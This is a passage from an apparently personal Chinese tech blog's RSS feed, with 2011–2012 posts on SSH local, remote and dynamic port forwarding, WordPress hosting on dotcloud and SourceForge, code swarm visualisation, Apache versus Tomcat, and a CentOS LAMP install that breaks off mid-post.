&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 考虑这样的场景：&lt;/p&gt;
&lt;p&gt;&lt;img alt=" 本地转发 " src="http://www.goorockey.com/uploads/2012/02/image002_thumb.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 一个运行在服务器 116.1.1.1 的程序提供端口 389 的数据通信，但防火墙只允许其他计算机对服务器做 ssh 的通信。&lt;/p&gt;
&lt;p&gt; 而客户端 116.4.0.1 为了完成通信，可以借助 ssh 的本地端口转发。&lt;/p&gt;
&lt;p&gt; 在客户端执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="mi"&gt;7001&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;389&lt;/span&gt;&lt;span class="err"&gt;    &lt;/span&gt; &lt;span class="mf"&gt;116.1.1.1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 同时把客户端程序输出到本机的 7001 端口。注意命令中的 localhost 是相对于 116.1.1.1 来说的。&lt;/p&gt;
&lt;p&gt; 那么整个数据流会是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 客户端程序到数据输出到客户端的 7001 口 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 客户端的 ssh 一直检测 7001 口，但发现本机有数据包到达，则把数据包加密，并通过跟服务端 116.1.1.1 的 ssh 通路传输 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 服务端的 sshd 收到数据包后包解密，并转发到服务端的 389 口 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 服务端返回数据，并原路返回 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 另外，在 ssh 本地转发命令中的 remote host 可以使任意的机子，包括本机或其他计算机。&lt;/p&gt;
&lt;p&gt; 例如，考虑这样的场景，用本地转发来进行远程桌面：&lt;/p&gt;
&lt;p&gt;&lt;img alt=" 远程桌面 " src="http://www.goorockey.com/uploads/2012/02/image_thumb.png"/&gt;&lt;/p&gt;
&lt;p&gt; 现在要在机子 A 对机子 C 做远程桌面。但机子 A 和机子 C 都在不同的子网，不能直接通信，也都只能跟机子 B 用 ssh 通信。&lt;/p&gt;
&lt;p&gt; 然后已知 windows 远程桌面的服务端端口是 3389，这我们可以在机子 A 执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="err"&gt;  &lt;/span&gt; &lt;span class="mi"&gt;13389&lt;/span&gt;&lt;span class="o"&gt;:&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;&lt;span class="mi"&gt;3389&lt;/span&gt;&lt;span class="err"&gt;    &lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 命令中的 13389 是任意的，但要注意只有管理员才能用 1~1024 的端口。&lt;/p&gt;
&lt;p&gt; 然后在 A 机子执行 yuan 远程桌面：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mstsc&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;13389&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 就能在 A 机子远程桌面控制 C 机子了。&lt;/p&gt;
&lt;h2 id="_2"&gt; 远程转发 &lt;/h2&gt;
&lt;p&gt; 其实远程转发跟本地转发是基本相同的。&lt;/p&gt;
&lt;p&gt; 命令是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;remote&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;   &lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 考虑这样的场景：&lt;/p&gt;
&lt;p&gt;&lt;img alt=" 远程转发 " src="http://www.goorockey.com/uploads/2012/02/image003_thumb.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 客户端 A 和服务端 B 的端口都还是 7001 和 389。&lt;/p&gt;
&lt;p&gt; 跟本地转发时候不同的是，ssh 连接的 sshd 在客户端 A，ssh 在服务端 B。&lt;/p&gt;
&lt;p&gt; 所以，远程转发可以应用在客户端 A 只允许对其做 ssh 连接的时候。&lt;/p&gt;
&lt;p&gt; 如果客户端和服务端都允许 ssh 连接，那选择本地转发还是远程转发都可以。&lt;/p&gt;
&lt;h2 id="_3"&gt; 动态转发 &lt;/h2&gt;
&lt;p&gt; 命令是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img alt=" 动态转发 " src="http://www.goorockey.com/uploads/2012/02/image005_thumb.jpg"/&gt;&lt;/p&gt;
&lt;p&gt; 跟其他两种端口转发不同的是，动态转发在数据包经过 ssh 通过到达服务端后，sshd 会根据把封装数据包的协议，转发到对应的主机和端口。&lt;/p&gt;
&lt;p&gt; 这时候 ssh 隧道是充当了 SOCKS 代理的作用。这就可以用来翻 X 之类了。&lt;/p&gt;
&lt;h2 id="ending"&gt;Ending&lt;/h2&gt;
&lt;p&gt; 总的来说，ssh 是个好东西 ~~~&lt;/p&gt;
&lt;h2 id="_4"&gt; 相关资料：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/"&gt;https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://lesca.me/blog/2011/03/01/ssh-port-forwarding-priciple-and-praticle-application/"&gt;http://lesca.me/blog/2011/03/01/ssh-port-forwarding-priciple-and-praticle-application/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Wed, 22 Feb 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-02-22:blog/2012/02/22/sshduan-kou-zhuan-fa/</guid><category>network</category><category>ssh</category></item><item><title>在dotcloud上搭建wordpress</title><link>http://www.goorockey.com/blog/2012/02/07/zai-dotcloudshang-da-jian-wordpress/</link><description>
&lt;p&gt; 之前在 sourceforge 搭建了 wordpress，但 SF 有两点不好：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;SF 在防火墙禁止了对外连接，使得 WP 好多功能、插件都无法使用（如 Akismet）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 访问 SF 速度很慢很慢 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 之后在寻找更好的方案时，偶遇 dotcloud 上搭建 wordpress 的文章，还看到了借 dotcloud 的 ssh 来翻 x 哦。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id="dotcloud"&gt;dotcloud 介绍 &lt;/h2&gt;
&lt;p&gt;dotcloud 是 PaaS(Platform as a Service) 的云计算平台，类似的还有 GAE、Heroku、国内的 SAE。&lt;/p&gt;
&lt;p&gt;dotcloud 支持几乎所有主流服务，php、java、python、ruby、mysql、postsql、node.js、Hadoop 等等。详细参见：&lt;a href="http://docs.dotcloud.com/firststeps/platform-overview/"&gt;http://docs.dotcloud.com/firststeps/platform-overview/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;dotcloud 对搭建的应用没有空间和流量限制，但现在有两个限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 每个用户只能有两个应用（每个用户对应一个邮箱，有多个邮箱就可以多申请几个了嘛，呵呵）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 网上流传数据库容量限制在 10M（官网上没找到这个说法）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;dotcloud 的访问速度还是很快的。&lt;/p&gt;
&lt;h2 id="dotcloud_1"&gt;dotcloud 使用 &lt;/h2&gt;
&lt;p&gt; 搭建 wordpress 的话，网上资源很多，我主要是参考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://blog.yangtse.me/2011/10/wordpress-dotcloud/"&gt;http://blog.yangtse.me/2011/10/wordpress-dotcloud/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://olddocs.dotcloud.com/tutorials/wordpress/"&gt;http://olddocs.dotcloud.com/tutorials/wordpress/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 反正算蛮简单的。&lt;/p&gt;
&lt;h2 id="_1"&gt; 建议：&lt;/h2&gt;
&lt;p&gt; 不要用 postinstall 脚本连接的方法。由于 dotcloud 的 push，是把原有的全部删除，重新建立一份，这个脚本是把 wp-content 移出 current 目录，防止 push 后把 wp-content 覆盖了。&lt;/p&gt;
&lt;p&gt; 但由于 wordpress 的 bug（其他应用不确定），一些插件会出现路径的错误。例子可见：&lt;a href="http://blog.yangtse.me/2011/10/wordpress-dotcloud-habari-error/"&gt;http://blog.yangtse.me/2011/10/wordpress-dotcloud-habari-error/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;dotcloud 的 push 我除了第一次上传代码用过，之后都是直接用 ssh 控制的。所以我就干脆不用 postinstall 脚本了。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 07 Feb 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-02-07:blog/2012/02/07/zai-dotcloudshang-da-jian-wordpress/</guid><category>blog</category><category>dotcloud</category><category>wordpress</category></item><item><title>Code Swarm</title><link>http://www.goorockey.com/blog/2012/02/03/code-swarm/</link><description>
&lt;p&gt; 今天拿自己项目组 svn 的日志来小玩了一下 code swarm。&lt;/p&gt;
&lt;h2 id="code-swarm"&gt; 什么是 code swarm?&lt;/h2&gt;
&lt;p&gt;code swarm 是可以把 svn、cvs、git 等代码管理系统的日志，以可视化的形式展现的项目。&lt;/p&gt;
&lt;p&gt;swarm 是蜂群的意思，code swarm 会以蜂群的形式表示每个人上传的文件。&lt;/p&gt;
&lt;!--more--&gt;
&lt;p&gt; 很多大的项目，如 Apache、Python、豆瓣等，都做了自己的 code swarm。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Apache、Python 等：&lt;a href="http://www.michaelogawa.com/code_swarm"&gt;http://www.michaelogawa.com/code_swarm&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 豆瓣：&lt;a href="http://v.youku.com/v_show/id_XMzQzNDc4MDk2.html"&gt;http://v.youku.com/v_show/id_XMzQzNDc4MDk2.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 我个人感觉，看别人的 code swarm 没什么特别的感受，只有看自己项目的才有感觉，呵呵。&lt;/p&gt;
&lt;h2 id="code-swarm_1"&gt; 使用 code swarm&lt;/h2&gt;
&lt;p&gt; 可以从它 google code 的主页中下载代码：&lt;a href="http://code.google.com/p/codeswarm/downloads/list"&gt;http://code.google.com/p/codeswarm/downloads/list&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; 我参照别人博客，使用了 code swarm 别的 fork：&lt;a href="https://github.com/rictic/code_swarm"&gt;https://github.com/rictic/code_swarm&lt;/a&gt;，它可以显示每个人的头像。&lt;/p&gt;
&lt;p&gt; 根据 wiki 或下载包内的 README，使用 code swarm，要先安装 java 和 ant。&lt;/p&gt;
&lt;p&gt;code swarm 有可以通过 run.bat 或者 runrepositoryfetch.bat 来启动。run.bat 需要我们手工把 svn 等软件的日志转为 code swarm 所需的 xml，而 runrepositoryfetch.bat 可以输入 reposition url，让 code swarm 自动下载日志并转换。我选择简单的 runrepositoryfetch.bat 方式。&lt;/p&gt;
&lt;p&gt; 在命令行提示中选择配置文件后，code swarm 就能呈现了，但还可以修改配置来达到自己的效果。&lt;/p&gt;
&lt;h2 id="code-swarm_2"&gt; 配置 code swarm&lt;/h2&gt;
&lt;p&gt; 我觉得关键的配置：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;InputFile&lt;/strong&gt; code swarm 所需的 xml 文件 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TakeSnapshots&lt;/strong&gt; 是否保存每一帧图片。code swarm 不能直接输出视频，只能输出每一帧图片。所以我们要导出视频的话，需要自行把每一帧图片转换为视频。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SnapshotLocation&lt;/strong&gt; 保存输出图片的目录 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 还有一些控制帧速度，显示项等等的配置。&lt;/p&gt;
&lt;p&gt; 以下是 fork 中才有的配置：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;AvatarFetcher&lt;/strong&gt; 每个人使用头像的来源。可以是 NoAvatar（没有头像），GravatarFetcher（程序自己生成），LocalAvatar（提供本地目录，使用跟 commiter id 对应的头像）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;LocalAvatarDirectory&lt;/strong&gt; LocalAvatar 方式时，存放头像的目录，目录里如果有文件名与 commiter id 相同的图片，则使用该图片否则使用默认头像。如果没有默认头像，则程序会中断。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;LocalAvatarDefaultPic&lt;/strong&gt; 默认头像 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;AvatarSize&lt;/strong&gt; 选择 LocalAvatar 方式时，每张头像的高或宽。这里要求每张头像图片的尺寸相同，且一定是正方形。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CircularAvatars&lt;/strong&gt; 用圆形截取头像图片，这会用到程序代码 src 下的 mask.png 图片，这里也要注意修改 AvatarSize 后，mask.png 的尺寸也要改变，否则程序中断。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="code-swarm_3"&gt; 把 code swarm 的图片合成为视频 &lt;/h2&gt;
&lt;p&gt; 方法很多，抱着学习的心态，我试着按 wiki 的方法用 mencoder。&lt;/p&gt;
&lt;p&gt; 我要加背景音乐，所以加了参数 -audiofile：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;mencoder&lt;/span&gt; &lt;span class="n"&gt;mf&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//*.png -mf fps=33:type=png -ovc lavc -oac copy –audiofile bg.mp3 -o my.avi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这里可以通过修改 fps 的值来控制生成视频的帧速度。&lt;/p&gt;
&lt;p&gt; 还可以用 mencoder 添加字幕，这个我就没做了。&lt;/p&gt;
&lt;p&gt; 我的视频：&lt;a href="http://v.youku.com/v_show/id_XMzQ4NjA5ODYw.html"&gt;http://v.youku.com/v_show/id_XMzQ4NjA5ODYw.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;P.S. 相关资料 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;【code swarm wiki】 ：&lt;a href="http://code.google.com/p/codeswarm/wiki/GeneratingAVideo"&gt;http://code.google.com/p/codeswarm/wiki/GeneratingAVideo&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【fork of code swarm】：&lt;a href="https://github.com/rictic/code_swarm"&gt;https://github.com/rictic/code_swarm&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【制作 code swarm】：&lt;a href="http://blog.xupeng.me/2012/01/12/code-swarm/"&gt;http://blog.xupeng.me/2012/01/12/code-swarm/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【用 mencoder 把多张图片合成为视频】：&lt;a href="http://www.mplayerhq.hu/DOCS/HTML/en/menc-feat-enc-images.html"&gt;http://www.mplayerhq.hu/DOCS/HTML/en/menc-feat-enc-images.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【使用 mencoder】：&lt;a href="http://hi.baidu.com/creatives/blog/item/41f6c32ad06cdb2bd42af128.html"&gt;http://hi.baidu.com/creatives/blog/item/41f6c32ad06cdb2bd42af128.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【windows 下安装 mencoder】：&lt;a href="http://hi.baidu.com/%D7%AF%D7%D3%C8%E7%CA%C7%CB%B5/blog/item/611a28b11abebd5f0823021b.html"&gt;http://hi.baidu.com/%D7%AF%D7%D3%C8%E7%CA%C7%CB%B5/blog/item/611a28b11abebd5f0823021b.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Fri, 03 Feb 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-02-03:blog/2012/02/03/code-swarm/</guid><category>趣味</category></item><item><title>博客转移了（改用sourceforge+wordpress）</title><link>http://www.goorockey.com/blog/2012/01/28/bo-ke-zhuan-yi-liao-gai-yong-sourceforgewordpress/</link><description>
&lt;p&gt; 这几天把博客从 GAE+micolog 转到了 sourceforge+wordpress，主要是考虑到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 服务器：GAE 现在对流量加大了限制，而 sourceforge 是没有流量或空间限制的 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 博客系统：wordpress 的资源币 micolog 的要多很多 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 主要做了几件事：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sourceforge+wordpress 建站 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;micolog 数据导入到 wordpress&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 优化 wordpress：主题、插件、google analytics&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;
&lt;p&gt; 考虑到 SEO 的域名权重问题，就保留 sourceforge 的二级域名了。&lt;/p&gt;
&lt;p&gt; 教程的话网上资源很多，值得记录的东西：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 安装 wordpress，及其主题、插件等资源时，最好用 ssh 登录到 sourceforge，从 sourceforge 那边 wget 下载，而不要从自己机子下载。因为资源多在国外的服务器，这样速度快多了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 注意关闭 sourceforge 项目管理中不必要的访问权限，以免博客里的文件被在 sourceforge 中能被访问。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 感叹 sourceforge 真是太伟大了！ 感叹 wordpress 真的就两个字：折腾！！&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;2012.1.29 更新：&lt;/p&gt;
&lt;p&gt; 昨天还发现 github+octopress 这种免费建博客的形式。&lt;/p&gt;
&lt;p&gt; 但建的是静态站点，即服务器存放的就只是 html+css+js 网页 , 没有 php、asp 等。&lt;/p&gt;
&lt;p&gt; 优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 最重要的优点是 git 的分布式管理，保证博文等数据不容易丢失；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;git 的其他各种优点 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 静态站点的优点：响应速度快，对服务器端的负荷小 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 缺点 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 我觉得缺点主要是静态站点的后期维护成本高！  因为到了后期，文章等数据多了，服务器就会存有大量网页，大大增加修改、备份等维护的成本！！&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 折腾 octopress 的成本。octopress 的官网说其是 "a blog framework for &lt;em&gt;HACKERS&lt;/em&gt;"，本身是 ruby 应用，即折腾它要玩 ruby。要折腾 octopress 似乎比较适合程序猿。（ruby 折腾迷略过此条。。）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 考虑到静态站点的后期维护问题，我觉得还是 SF+WP 比较适合现在的我啦 ~~ 嘻嘻 &lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;2012.2.5 更新：&lt;/p&gt;
&lt;p&gt; 根据 SF 的官方规定，架在上面的服务的 outbound connection 会被禁止。详细请参看： &lt;a href="http://sourceforge.net/apps/trac/sourceforge/wiki/Project%20web%20and%20developer%20web%20platform#Outboundconnectivity"&gt;http://sourceforge.net/apps/trac/sourceforge/wiki/Project%20web%20and%20developer%20web%20platform#Outboundconnectivity&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; 而因为很多 WP 的功能、插件等都会用到向外发送请求，所以在 SF 上架 WP 的时候，很多功能和插件都用不了的。&lt;/p&gt;
&lt;p&gt; 例如，WP 内置的更新 ping 服务器，Akismet， google sitemap，微博同步等等。。&lt;/p&gt;
&lt;p&gt; 现在还没找到什么办法，唉。。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sat, 28 Jan 2012 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-01-28:blog/2012/01/28/bo-ke-zhuan-yi-liao-gai-yong-sourceforgewordpress/</guid><category>blog</category><category>wordpress</category><category>sourceforge</category></item><item><title>Apache和Tomcat</title><link>http://www.goorockey.com/blog/2011/11/22/apachehe-tomcat/</link><description>
&lt;p&gt; 调研了一下 Apache 和 Tomcat：&lt;/p&gt;
&lt;p&gt;1.apache 只是一个 web 服务器，负责响应客户端的请求。&lt;/p&gt;
&lt;p&gt;2.apache 对于页面请求：&lt;/p&gt;
&lt;!--more--&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt; 如果是静态页面请求，会立刻返回相应的页面；&lt;/span&gt;
&lt;span class="err"&gt; 如果是动态页面请求，&lt;/span&gt;&lt;span class="n"&gt;apache&lt;/span&gt;&lt;span class="err"&gt; 会根据 &lt;/span&gt;&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="err"&gt; 中 &lt;/span&gt;&lt;span class="n"&gt;AddType&lt;/span&gt;&lt;span class="err"&gt; 的配置，把请求提交给合适的动态脚本解析程序来处理，处理后生成的静态页面返回给 &lt;/span&gt;&lt;span class="n"&gt;apache&lt;/span&gt;&lt;span class="err"&gt;，再返回给客户端。所以在配置 &lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="err"&gt; 和 &lt;/span&gt;&lt;span class="n"&gt;jsp&lt;/span&gt;&lt;span class="err"&gt; 这样的环境的时候，都要在 &lt;/span&gt;&lt;span class="n"&gt;httd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="err"&gt; 中添加对应的 &lt;/span&gt;&lt;span class="n"&gt;AddTpye&lt;/span&gt;&lt;span class="err"&gt; 语句。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3.tomcat 侧重于是一个 Servlet/JSP 的容器，但也能可以独立于 apache 运行，响应 html 请求 &lt;/p&gt;
&lt;p&gt;4.tomcat 响应静态页面较 apache 要慢 &lt;/p&gt;
&lt;p&gt;5. 整合 apache 和 tomcat 可以有三种方法 :JK,http_proxy,ajp_proxy&lt;/p&gt;
&lt;p&gt; 具体介绍见：&lt;a href="http://www.ibm.com/developerworks/cn/opensource/os-lo-apache-tomcat"&gt;http://www.ibm.com/developerworks/cn/opensource/os-lo-apache-tomcat&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;JK 较老，相对比较稳定，配置比较麻烦 &lt;/p&gt;
&lt;p&gt; 两种 proxy 模式原理都是让 apache 做 tomcat 的代理，配置简单 &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 22 Nov 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-11-22:blog/2011/11/22/apachehe-tomcat/</guid><category>linux</category><category>apache</category><category>tomcat</category></item><item><title>CentOS下安装Apache+php+mysql Tomcat</title><link>http://www.goorockey.com/blog/2011/11/12/centosxia-an-zhuang-apachephpmysql-tomcat/</link><description>
&lt;h2 id="apachephpmysql"&gt; 一、安装及配置 Apache+php+mysql&lt;/h2&gt;
&lt;p&gt;1. 安装 Apache+php+mysql&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 安装 Apache+php+Mysql，php 连接 mysql 的组件 &lt;/p&gt;
&lt;p&gt;yum -y install httpd php mysql mysql-server php-mysql&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 安装 mysql 扩展 &lt;/p&gt;
&lt;p&gt;yum -y install mysql-connector-odbc mysql-devel libdbi-dbd-mysql&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 安装 php 的扩展 &lt;/p&gt;
&lt;p&gt;yum -y install php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 安装 apache 扩展 &lt;/p&gt;
&lt;p&gt;yum -y install httpd-manual mod_ssl mod_perl mod_auth_mysql&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;
&lt;p&gt; 或者一次性粘贴安装 :&lt;/p&gt;
